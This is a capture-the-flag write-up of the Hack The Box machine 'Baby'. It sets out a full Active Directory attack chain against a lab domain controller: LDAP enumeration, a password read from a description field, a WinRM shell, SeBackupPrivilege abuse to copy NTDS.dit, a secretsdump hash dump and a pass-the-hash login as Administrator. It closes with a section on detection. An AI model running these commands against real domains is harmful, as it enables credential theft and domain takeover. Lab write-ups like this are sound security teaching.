---
icon: bottle-baby
---

# HTB-BABY (VL)

<figure><img src="../../../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

### Attack Chain Summary

The complete attack path for Baby:

```
1. Nmap Enumeration → Service Discovery → Domain Controller Identification
2. SMB Enumeration → Access Denied → Guest/Null Sessions Failed
3. LDAP Anonymous Bind → User Enumeration → 8 Initial Users
4. AS-REP Roasting → Failed → No Vulnerable Accounts
5. Password Spraying → Failed → No Weak Credentials
6. LDAP Description Analysis → Password Discovery → BabyStart123!
7. Extended LDAP Query → Additional User → Caroline.Robinson
8. Password Testing → Expired Password → Requires Reset
9. Password Change → Valid Credentials → Remote Management Access
10. Evil-WinRM Access → User Shell → SeBackupPrivilege Discovery
11. Registry Hive Extraction → Shadow Copy Creation → NTDS.dit Access
12. Credential Dumping → Domain Hash Extraction → Administrator Hash
13. Pass-the-Hash Attack → Administrator Access → Full Domain Compromise
```

### Reconnaissance & Initial Enumeration

#### Nmap Scan Results

Comprehensive port scan reveals standard Windows Domain Controller services:

```bash
nmap -sC -sV -oA baby 10.129.121.180
```

**Open Ports & Services**:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-18 16:31:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
[additional RPC ports...]
```

**Key Information from RDP Certificate**:

```
Target_Name: BABY
NetBIOS_Domain_Name: BABY
NetBIOS_Computer_Name: BABYDC
DNS_Domain_Name: baby.vl
DNS_Computer_Name: BabyDC.baby.vl
DNS_Tree_Name: baby.vl
Product_Version: 10.0.20348
System_Time: 2025-09-18T16:32:29+00:00
```

***

### SMB Enumeration Attempts

#### Guest Account Testing

**SMB Share Enumeration with Guest Account**:

```bash
smbmap -H 10.129.121.180 -d 'baby.vl' -u 'GUEST' -p ''
```

⛔ **Result**: Access denied - Guest account appears to be disabled or restricted.

#### RID Brute Force Attempts

**Guest Account RID Brute Force**:

```bash
nxc smb 10.129.121.180 -u 'guest' -p '' --rid-brute
```

⛔ **Result**: Guest account disabled - no results returned.

**Null Session RID Brute Force**:

```bash
nxc smb 10.129.121.180 -u '' -p '' --rid-brute
```

⛔ **Result**: Access denied - null sessions not permitted.

#### SMB Enumeration Summary

❌ **Failed Approaches**:

* Anonymous SMB access
* Guest account enumeration
* RID brute forcing with guest/null sessions
* No accessible SMB shares discovered

The SMB service is properly secured against anonymous and guest enumeration attempts.

***

### LDAP Enumeration (Successful Approach)

#### Anonymous LDAP Bind

**Basic User Enumeration**:

```bash
ldapsearch -x -H ldap://10.129.121.180 -b "DC=baby,DC=vl" "(objectCategory=person)" sAMAccountName | grep sAMAccountName
```

**Extract Usernames to File**:

```bash
ldapsearch -x -H ldap://10.129.121.180 -b "DC=baby,DC=vl" "(objectCategory=person)" sAMAccountName \
| grep sAMAccountName \
| grep -v "#" \
| cut -d" " -f2 \
> users.txt
```

**Initial User Discovery** (8 users found):

```
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```

**Success**: Anonymous LDAP bind allowed user enumeration.

***

### Initial Attack Attempts

#### AS-REP Roasting

Attempt to find accounts with "Do not require Kerberos preauthentication":

```bash
GetNPUsers.py 'baby.vl'/ -usersfile /mnt/NASDF017E/Kali/HTB/Baby_HTB/users.txt -dc-ip 10.129.121.180 -no-pass
```

**Result**: No AS-REP roastable accounts found.

#### Password Spraying

Test for weak credentials using username as password:

```bash
nxc smb 10.129.121.180 -u 'users.txt' -p 'users.txt' --continue-on-success --no-brute
```

**Result**: No valid username/password pairs discovered.

***

### Password Discovery in LDAP Descriptions

#### Enhanced LDAP Enumeration

**Query for User Descriptions**:

```bash
ldapsearch -x -H ldap://10.129.121.180 -b "DC=baby,DC=vl" "(objectCategory=person)" sAMAccountName description
```

**Key Discovery**: Found password in Teresa.Bell's description field:

* **Username**: Teresa.Bell
* **Password**: `BabyStart123!`

#### Credential Validation Attempt

**Test Teresa.Bell Credentials**:

```bash
nxc smb 10.129.121.180 -u 'Teresa.Bell' -p 'BabyStart123!' --users
```

**Result**: Password not working for Teresa.Bell account.

***

### Extended LDAP Discovery

#### Comprehensive LDAP Search

**Unrestricted LDAP Query**:

```bash
ldapsearch -x -H ldap://10.129.121.180 -b "dc=baby,DC=vl"
```

**Additional User Found**: `Caroline.Robinson`

* This user was missing from initial enumeration due to "password must be changed at next logon" flag

**Updated User List**:

```
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson ← New discovery
```

#### Password Testing with New User

**Test Discovered Password with Caroline.Robinson**:

```bash
nxc smb 10.129.121.180 -u users.txt -p 'BabyStart123!'
```

**Success**: The password `BabyStart123!` is valid for Caroline.Robinson, but requires a password change.

***

### Password Reset & Access

#### Password Change Process

**Change Caroline.Robinson's Password**:

```bash
kpasswd Caroline.Robinson
```

* **Old Password**: `BabyStart123!`
* **New Password**: `pa$$w0rd`

#### LDAP Authentication Verification

**Verify New Credentials**:

```bash
ldapsearch -x -H ldap://10.129.121.180 -D "Caroline.Robinson@baby.vl" -w 'pa$$w0rd' -b "DC=baby,DC=vl" "(sAMAccountName=Caroline.Robinson)" memberOf
```

**Key Finding**: Caroline.Robinson is a member of the **Remote Management Users Group**

***

### Initial Shell Access

#### Evil-WinRM Connection

**Establish Remote Session**:

```bash
evil-winrm -i 10.129.121.180 -u 'baby.vl\Caroline.Robinson' -p 'pa$$w0rd'
```

**Success**: Successfully obtained shell as Caroline.Robinson on the Domain Controller.

#### User Flag Retrieval

**Get User Flag**:

```bash
type C:\Users\Caroline.Robinson\Desktop\user.txt
```

**User Flag Obtained**: Successfully retrieved user.txt from Caroline.Robinson's desktop.

***

### Privilege Enumeration

#### User Privilege Analysis

**Check User Privileges and Groups**:

```bash
whoami /all
```

**Critical Discovery**: User has **SeBackupPrivilege** and **SeRestorePrivilege** enabled.

**Privilege Details**:

* `SeBackupPrivilege` - Back up files and directories
* `SeRestorePrivilege` - Restore files and directories

These privileges allow bypassing access restrictions on system files and accessing sensitive data like NTDS.dit.

***

### Privilege Escalation via SeBackupPrivilege

#### Preparation

**Create Working Directory**:

```bash
cd c:\
mkdir dump
```

#### Registry Hive Extraction

**Save SAM and SYSTEM Hives**:

```bash
reg save hklm\sam c:\dump\sam
reg save hklm\system c:\dump\system
cd c:\dump
```

#### Volume Shadow Copy Creation

**Create Script for Diskshadow**: Create `script.txt` with the following content:

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

**Upload and Execute Script**:

```bash
upload script.txt
diskshadow /s script.txt
```

#### NTDS.dit Extraction

**Copy NTDS Database via Shadow Copy**:

```bash
robocopy /b E:\Windows\ntds . ntds.dit
```

**Success**: Successfully extracted NTDS.dit using SeBackupPrivilege.

#### File Download

**Download Critical Files**:

```bash
download ntds.dit
download system
download sam
```

***

### Credential Extraction

#### Hash Dumping

**Extract All Domain Hashes**:

```bash
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

**Critical Success**: Obtained all domain hashes including:

* **Administrator Hash**: `ee4457ae59f1e3fbd764e33d9cef123d`
* All user account hashes
* Machine account hashes
* Service account hashes

#### Hash Analysis

The secretsdump output provides:

* NTLM hashes for all domain users
* Kerberos keys
* Domain cached credentials
* Machine account secrets

***

### Root Access

#### Administrator Authentication

**Evil-WinRM as Administrator**:

```bash
evil-winrm -i 10.129.121.180 -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
```

**Success**: Successfully obtained Administrator shell using pass-the-hash attack.

#### Root Flag Retrieval

**Get Root Flag**:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag Obtained**: Successfully retrieved root.txt and achieved full domain compromise.

### Key Vulnerabilities Exploited

#### 1. Information Disclosure

* **Anonymous LDAP Bind** - Allowed user enumeration without authentication
* **Password in Description** - Sensitive credential stored in user description field

#### 2. Account Management Issues

* **Password Reuse** - Same password used across different accounts
* **Predictable Password Reset** - User account with expired password easily reset

#### 3. Excessive Privileges

* **SeBackupPrivilege** - Allowed bypass of file access restrictions
* **SeRestorePrivilege** - Enabled access to protected system files
* **Remote Management Access** - Domain user with WinRM capabilities

#### 4. Active Directory Misconfigurations

* **Unrestricted LDAP Queries** - Full domain information accessible anonymously
* **Privileged User Account** - Standard user with backup operator privileges

***

### Technical Details

#### LDAP Enumeration Techniques

* **Anonymous Bind**: `ldapsearch -x -H ldap://IP`
* **Filtered Queries**: `"(objectCategory=person)"` for users
* **Attribute Extraction**: `sAMAccountName description` for credentials
* **Comprehensive Search**: Unfiltered queries reveal hidden accounts

#### SeBackupPrivilege Abuse

* **Registry Access**: `reg save` commands bypass ACLs
* **Volume Shadow Copy**: `diskshadow` creates accessible snapshots
* **File Copying**: `robocopy /b` uses backup semantics
* **NTDS Extraction**: Direct access to domain database

#### Credential Extraction Process

1. **SAM Hive** - Local account hashes
2. **SYSTEM Hive** - Boot key for SAM decryption
3. **NTDS.dit** - Domain database with all domain credentials
4. **Secretsdump** - Impacket tool for hash extraction

***

### Detection Opportunities

#### Log Analysis

* **Event ID 4624** - Logon events for Caroline.Robinson
* **Event ID 4672** - Special privileges assigned to user session
* **Event ID 4698** - Scheduled task creation (if used)
* **Event ID 5136** - Directory service object modified

#### File Access Monitoring

* **Registry Access** - Monitor access to SAM/SYSTEM hives
* **NTDS.dit Access** - Critical file access alerts
* **Volume Shadow Copy** - Diskshadow execution monitoring
* **Backup Operations** - SeBackupPrivilege usage tracking

#### Network Monitoring

* **LDAP Queries** - Anonymous bind attempts and extensive queries
* **Kerberos Activity** - Authentication patterns and anomalies
* **WinRM Sessions** - Remote management connections

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
